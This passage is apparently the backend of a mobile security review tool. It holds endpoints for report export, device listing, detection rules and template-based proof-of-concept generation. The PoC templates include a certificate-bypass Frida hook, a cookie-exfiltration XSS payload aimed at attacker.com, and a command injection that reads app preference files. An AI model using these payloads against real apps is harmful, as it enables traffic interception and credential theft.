                    for f in findings
                ],
            }],
        }
        return Response(json.dumps(sarif, indent=2).encode(), mimetype="application/json",
                        headers={"Content-Disposition": f'attachment; filename="msra_{scan_id}.sarif"'})

    if fmt == "pdf":
        # Best-effort PDF via reportlab; fallback to plain-text if not installed
        try:
            from reportlab.lib.pagesizes import letter
            from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer, Table, TableStyle
            from reportlab.lib.styles import getSampleStyleSheet
            from reportlab.lib import colors

            buf = io.BytesIO()
            doc = SimpleDocTemplate(buf, pagesize=letter)
            styles = getSampleStyleSheet()
            story = []
            story.append(Paragraph(f"MSRA Security Report — {scan_d['filename']}", styles["Title"]))
            story.append(Paragraph(f"Scan ID: {scan_id} | Status: {scan_d['status']} | Platform: {scan_d['platform']}", styles["Normal"]))
            story.append(Spacer(1, 20))
            story.append(Paragraph(f"Total Findings: {len(findings)}", styles["Heading2"]))

            data = [["#", "Severity", "Title", "Category", "File"]]
            for i, f in enumerate(findings, 1):
                data.append([str(i), f.get("severity","").upper(), f.get("title","")[:50],
                              f.get("category","")[:30], (f.get("file_path") or "")[:40]])

            t = Table(data, repeatRows=1)
            t.setStyle(TableStyle([
                ("BACKGROUND", (0, 0), (-1, 0), colors.HexColor("#1e293b")),
                ("TEXTCOLOR", (0, 0), (-1, 0), colors.white),
                ("FONTSIZE", (0, 0), (-1, -1), 8),
                ("GRID", (0, 0), (-1, -1), 0.5, colors.grey),
                ("ROWBACKGROUNDS", (0, 1), (-1, -1), [colors.white, colors.HexColor("#f8fafc")]),
            ]))
            story.append(t)
            doc.build(story)
            buf.seek(0)
            return Response(buf.read(), mimetype="application/pdf",
                            headers={"Content-Disposition": f'attachment; filename="msra_{scan_id}.pdf"'})
        except ImportError:
            # Fallback: return as text
            lines = [f"MSRA Security Report — {scan_d['filename']}", f"Scan ID: {scan_id}", ""]
            for i, f in enumerate(findings, 1):
                lines.append(f"{i}. [{f.get('severity','').upper()}] {f.get('title','')}")
                lines.append(f"   Category: {f.get('category','')}")
                lines.append(f"   File: {f.get('file_path','')}")
                lines.append(f"   {f.get('description','')}")
                lines.append("")
            return Response("\n".join(lines).encode(), mimetype="text/plain",
                            headers={"Content-Disposition": f'attachment; filename="msra_{scan_id}.txt"'})


# ─── Dynamic analysis ──────────────────────────────────────────────────────────

@app.route("/api/dynamic/adb-devices", methods=["GET"])
def adb_devices():
    import subprocess
    try:
        result = subprocess.run(["adb", "devices"], capture_output=True, text=True, timeout=5)
        lines = result.stdout.strip().splitlines()
        devices = []
        for line in lines[1:]:
            if "\t" in line:
                serial, status = line.split("\t", 1)
                devices.append({"serial": serial.strip(), "status": status.strip()})
        return jsonify({"devices": devices})
    except FileNotFoundError:
        return jsonify({"devices": [], "message": "ADB not found in PATH"})
    except Exception as exc:
        return jsonify({"devices": [], "error": str(exc)})


@app.route("/api/dynamic/verify", methods=["POST"])
def start_dynamic():
    body = request.get_json(force=True) or {}
    job_id = str(uuid.uuid4())
    with get_db() as conn:
        conn.execute(
            """INSERT INTO dynamic_jobs (id, scan_id, finding_id, status, device, created_at, updated_at)
               VALUES (?,?,?,?,?,?,?)""",
            (job_id, body.get("scan_id", ""), body.get("finding_id"),
             "pending", body.get("device"), _now(), _now()),
        )
        conn.commit()
    # Background job simulation — mark as not_supported (no real device in headless env)
    threading.Timer(2.0, _finish_dynamic_job, args=(job_id,)).start()
    return jsonify({"job_id": job_id, "status": "pending"})


def _finish_dynamic_job(job_id: str) -> None:
    with get_db() as conn:
        conn.execute(
            "UPDATE dynamic_jobs SET status='not_supported', result=?, updated_at=? WHERE id=?",
            (json.dumps({"message": "Dynamic analysis requires a connected device or emulator."}),
             _now(), job_id),
        )
        conn.commit()


@app.route("/api/dynamic/jobs", methods=["GET"])
def dynamic_jobs():
    with get_db() as conn:
        rows = conn.execute("SELECT * FROM dynamic_jobs ORDER BY created_at DESC").fetchall()
    return jsonify({"jobs": [_row_to_dict(r) for r in rows]})


@app.route("/api/dynamic/verify/<job_id>", methods=["GET"])
def dynamic_job_status(job_id: str):
    with get_db() as conn:
        row = conn.execute("SELECT * FROM dynamic_jobs WHERE id=?", (job_id,)).fetchone()
    if not row:
        return jsonify({"error": "Job not found"}), 404
    d = _row_to_dict(row)
    if d.get("result"):
        d["result"] = json.loads(d["result"])
    return jsonify(d)


# ─── AI PoC generation ────────────────────────────────────────────────────────

@app.route("/api/generate-poc", methods=["POST"])
def generate_poc():
    body = request.get_json(force=True) or {}
    finding_id = body.get("finding_id")
    scan_id    = body.get("scan_id")

    finding = None
    if finding_id and scan_id:
        with get_db() as conn:
            row = conn.execute(
                "SELECT * FROM findings WHERE id=? AND scan_id=?", (finding_id, scan_id)
            ).fetchone()
            if row:
                finding = _row_to_dict(row)

    if not finding:
        return jsonify({"error": "Finding not found"}), 404

    # Template-based PoC (no AI key required)
    title    = finding.get("title", "")
    category = finding.get("category", "")
    evidence = finding.get("evidence", "")
    platform = "android"  # default

    poc_templates = {
        "SSL/TLS Bypass": (
            "# SSL Bypass PoC (Frida)\n"
            "import frida\n\n"
            "script = \"\"\"\n"
            "Java.perform(function() {\n"
            "  var TrustManager = Java.use('javax.net.ssl.X509TrustManager');\n"
            "  var SSLContext = Java.use('javax.net.ssl.SSLContext');\n"
            "  // Hook trust manager to accept all certificates\n"
            "  var tm = Java.registerClass({\n"
            "    name: 'com.poc.FakeTrustManager',\n"
            "    implements: [TrustManager],\n"
            "    methods: {\n"
            "      checkClientTrusted: function() {},\n"
            "      checkServerTrusted: function() {},\n"
            "      getAcceptedIssuers: function() { return []; }\n"
            "    }\n"
            "  });\n"
            "});\n\"\"\"\n"
        ),
        "Hardcoded Secrets": (
            f"# Hardcoded Secret PoC\n"
            f"# Finding: {title}\n"
            f"# Evidence: {evidence}\n\n"
            "# Extract from APK:\n"
            "# 1. apktool d app.apk -o output/\n"
            "# 2. grep -r 'api_key\\|password\\|secret' output/\n"
            "# 3. Use extracted credential against the target API:\n"
            "#    curl -H 'Authorization: Bearer <extracted_key>' https://api.target.com/v1/data\n"
        ),
        "WebView Security": (
            "# WebView JavaScript Injection PoC\n"
            "# Requires: app with WebView loading attacker-controlled content\n\n"
            "payload = '<script>fetch(\"https://attacker.com/exfil?c=\"+document.cookie)</script>'\n"
            "# Inject via:\n"
            "# 1. Intent URL: adb shell am start -a android.intent.action.VIEW -d 'http://attacker.com/xss.html'\n"
            "# 2. Deep link: app://internal?url=javascript:alert(1)\n"
        ),
        "Command Injection": (
            "# Runtime.exec Command Injection PoC\n"
            "# If user input reaches Runtime.exec():\n\n"
            "payload = '; id; whoami; cat /data/data/com.target.app/shared_prefs/*.xml'\n"
            "# Test via input fields, intent extras, or deeplink parameters\n"
        ),
    }

    poc_code = None
    for key, template in poc_templates.items():
        if key.lower() in category.lower() or key.lower() in title.lower():
            poc_code = template
            break

    if not poc_code:
        poc_code = (
            f"# PoC for: {title}\n"
            f"# Category: {category}\n"
            f"# Evidence: {evidence}\n\n"
            "# Manual testing steps:\n"
            "# 1. Decompile APK: apktool d app.apk -o output/\n"
            "# 2. Search for the pattern: grep -r 'PATTERN' output/\n"
            "# 3. Verify exploitability with Frida or manual testing\n"
            "# 4. Document impact and steps to reproduce\n"
        )

    return jsonify({
        "finding_id": finding_id,
        "title": title,
        "poc_type": "template",
        "poc_code": poc_code,
        "disclaimer": "This PoC is template-based. Verify exploitability manually.",
    })


# ─── Rules / Detection Patterns ───────────────────────────────────────────────

@app.route("/api/rules/stats", methods=["GET"])
def rules_stats():
    with get_db() as conn:
        rows = conn.execute(
            "SELECT platform, COUNT(*) as cnt FROM rules WHERE enabled=1 GROUP BY platform"
        ).fetchall()
        total = conn.execute("SELECT COUNT(*) FROM rules").fetchone()[0]
        enabled = conn.execute("SELECT COUNT(*) FROM rules WHERE enabled=1").fetchone()[0]
        custom = conn.execute("SELECT COUNT(*) FROM rules WHERE is_custom=1").fetchone()[0]
    return jsonify({
        "total": total,
        "enabled": enabled,
        "custom": custom,
        "by_platform": {r["platform"]: r["cnt"] for r in rows},
    })


@app.route("/api/rules", methods=["GET"])
def list_rules():
    with get_db() as conn:
        rows = conn.execute("SELECT * FROM rules ORDER BY is_custom DESC, name").fetchall()
    return jsonify({"rules": [_row_to_dict(r) for r in rows], "total": len(rows)})


@app.route("/api/rules", methods=["POST"])
def create_rule():
    body = request.get_json(force=True) or {}
    name    = body.get("name", "").strip()
    pattern = body.get("pattern", "").strip()
    if not name or not pattern:
        return jsonify({"error": "name and pattern are required"}), 400
    try:
        re.compile(pattern)
    except re.error as e:
        return jsonify({"error": f"Invalid regex: {e}"}), 400

    rule_id = str(uuid.uuid4())[:16]
    with get_db() as conn:
        conn.execute(
            """INSERT INTO rules (id, name, description, pattern, severity, category, platform, enabled, is_custom, created_at, updated_at)
               VALUES (?,?,?,?,?,?,?,?,1,?,?)""",
            (rule_id, name, body.get("description", ""), pattern,
             body.get("severity", "medium"), body.get("category", "Custom"),
             body.get("platform", "all"), 1, _now(), _now()),
        )
        conn.commit()
    return jsonify({"id": rule_id, "name": name, "status": "created"}), 201


@app.route("/api/rules/<rule_id>", methods=["PUT"])
def update_rule(rule_id: str):
    body = request.get_json(force=True) or {}
    updates = {k: v for k, v in body.items() if k in ("name", "description", "pattern", "severity", "category", "platform")}
    if "pattern" in updates:
        try:
            re.compile(updates["pattern"])
        except re.error as e:
            return jsonify({"error": f"Invalid regex: {e}"}), 400
    if not updates:
        return jsonify({"error": "No valid fields to update"}), 400
    updates["updated_at"] = _now()
    set_clause = ", ".join(f"{k}=?" for k in updates)
    with get_db() as conn:
        conn.execute(f"UPDATE rules SET {set_clause} WHERE id=?", (*updates.values(), rule_id))
        conn.commit()
    return jsonify({"id": rule_id, "status": "updated"})


@app.route("/api/rules/<rule_id>", methods=["DELETE"])
def delete_rule(rule_id: str):
    with get_db() as conn:
        conn.execute("DELETE FROM rules WHERE id=? AND is_custom=1", (rule_id,))
        conn.commit()
    return "", 204


@app.route("/api/rules/<rule_id>/toggle", methods=["PATCH"])
def toggle_rule(rule_id: str):
    with get_db() as conn:
        row = conn.execute("SELECT enabled FROM rules WHERE id=?", (rule_id,)).fetchone()
        if not row:
            return jsonify({"error": "Rule not found"}), 404
        new_state = 0 if row["enabled"] else 1
        conn.execute("UPDATE rules SET enabled=?, updated_at=? WHERE id=?", (new_state, _now(), rule_id))
        conn.commit()
    return jsonify({"id": rule_id, "enabled": bool(new_state)})


# ─── Health ───────────────────────────────────────────────────────────────────

@app.route("/api/health", methods=["GET"])
@app.route("/health", methods=["GET"])
def health():
    with get_db() as conn:
        conn.execute("SELECT 1")
    return jsonify({"status": "ok", "service": "MSRA", "version": "1.0.0"})


# ─── Entry point ──────────────────────────────────────────────────────────────

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="MSRA Mobile Security Review Assistant")
    parser.add_argument("--port", type=int, default=int(os.environ.get("MSRA_PORT", 5001)))
    parser.add_argument("--host", default=os.environ.get("MSRA_HOST", "127.0.0.1"))
    parser.add_argument("--db", default=DB_PATH)
    args = parser.parse_args()

    DB_PATH = args.db
    init_db()

    logger.info(f"MSRA starting on {args.host}:{args.port}")
    app.run(host=args.host, port=args.port, threaded=True)
